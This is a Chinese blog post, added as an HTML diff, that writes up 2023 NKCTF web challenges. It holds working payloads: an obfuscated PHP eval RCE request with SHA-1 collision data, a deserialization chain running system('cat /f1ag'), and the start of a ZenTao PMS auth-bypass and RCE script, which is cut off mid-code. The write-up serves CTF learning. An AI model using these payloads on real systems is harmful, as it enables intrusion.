@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="2023NKCTF-WEB" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            2023NKCTF-WEB
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#eazy-php"><span class="post-toc-text">eazy_php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#baby-php"><span class="post-toc-text">baby_php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#easy-pms"><span class="post-toc-text">easy_pms</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hard-php"><span class="post-toc-text">hard_php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#webpagetest"><span class="post-toc-text">webpagetest</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#easy-cms"><span class="post-toc-text">easy_cms</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#xiaopi"><span class="post-toc-text">xiaopi</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>大多数是可以在网上找到poc和文章，跟着打就行的，没有喜欢的那种代码审计题(XD)</p>
+<h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!!&#x27;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;error!!!!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;error!!!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> error!</span><br></pre></td></tr></table></figure>
+
+<p>简单分析一下</p>
+<ul>
+<li>md5数组绕过</li>
+<li>sha1碰撞</li>
+<li>php弱类型，114514.9!&#x3D;114514，intval(‘114514.9’)&#x3D;&#x3D;114514</li>
+<li>php参数规范化，如果参数名里面带有<code>[</code>,<code>.</code>等字符，会自动转换为<code>_</code>，但是只会转换一次，所以使用<code>NS[CTF.go</code>就会转换为<code>NS_CTF.go</code></li>
+<li>自增rce</li>
+</ul>
+<p>数据包如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?a[]=1&amp;b[]=2&amp;e=114514.9&amp;NS[CTF.go=1 HTTP/1.1</span><br><span class="line">Host: a966893b-3e1a-4e54-b576-29f8a7f571cc.node2.yuzhian.com.cn</span><br><span class="line">Content-Length: 2568</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://a966893b-3e1a-4e54-b576-29f8a7f571cc.node2.yuzhian.com.cn</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://nkctf.yuzhian.com.cn:8000/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: _ga=GA1.1.1935970464.1678703074; _ga_KCSGQQ51ER=GS1.1.1679725242.12.1.1679727705.0.0.0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=$_=[].[];$_=$_[&#x27;!&#x27;==&#x27;$&#x27;];$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___=$__;$_____=$__;$_____%2B%2B;$_____%2B%2B;$_____%2B%2B;$_____%2B%2B;$_____%2B%2B;$_____%2B%2B;$___.=$_____;$___.=$__;$__%2B%2B;$___.=$__;$_%2B%2B;$_%2B%2B;$_%2B%2B;$_%2B%2B;$___.=$_;$_%2B%2B;$_%2B%2B;$_%2B%2B;$_%2B%2B;$_%2B%2B;$_%2B%2B;$_%2B%2B;$_%2B%2B;$___.=$_;$____=&#x27;_&#x27;;$_=[].[];$_=$_[&#x27;!&#x27;==&#x27;$&#x27;];$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$_=$$____;$___($_[_]);&amp;_=cat /f*</span><br></pre></td></tr></table></figure>
+
+<h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ItS SO CREAZY&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">            <span class="variable">$function</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个简单的反序列化，但是命令执行的时候需要绕一下</p>
+<p>使用<code>eval(urldecode(xxx))</code>的方式来绕过检测，需要进行二次url编码</p>
+<p><code>system(&#39;cat /f1ag&#39;);</code>&#x3D;&gt;<code>%73%79%73%74%65%6D%28%27%63%61%74%20/%66%31%61%67%27%29%3B</code></p>
+<p><code>/</code>的url编码为<code>%2F</code>，会被过滤，所以需要注意一下，不要编码<code>/</code></p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;func=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;shell=<span class="string">&quot;urldecode&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;cmd=<span class="string">&quot;%73%79%73%74%65%6D%28%27%63%61%74%20/%66%31%61%67%27%29%3B&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>就是禅道的一个rce漏洞，网上有poc，直接用就行<a target="_blank" rel="noopener" href="https://github.com/webraybtl/zentaopms_poc">zentaopms_poc</a></p>
+<p>只不过注意一下，他命令执行只有返回一行，所以需要将他base64编码一一下</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># !/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">权限绕过+RCE POC 伪静态传参版</span></span><br><span class="line"><span class="string">禅道系统 影响版本 安全版本</span></span><br><span class="line"><span class="string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span></span><br><span class="line"><span class="string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span></span><br><span class="line"><span class="string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">    <span class="comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># url=&quot;http://10.211.55.3:8008&quot;</span></span><br><span class="line">    url1 = url+<span class="string">&#x27;/misc-captcha-user.html&#x27;</span></span><br><span class="line">    <span class="comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span></span><br><span class="line">    <span class="comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span></span><br><span class="line">    url3 = url + <span class="string">&#x27;repo-create.html&#x27;</span></span><br><span class="line">    url4 = url + <span class="string">&#x27;repo-edit-10000-10000.html&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span 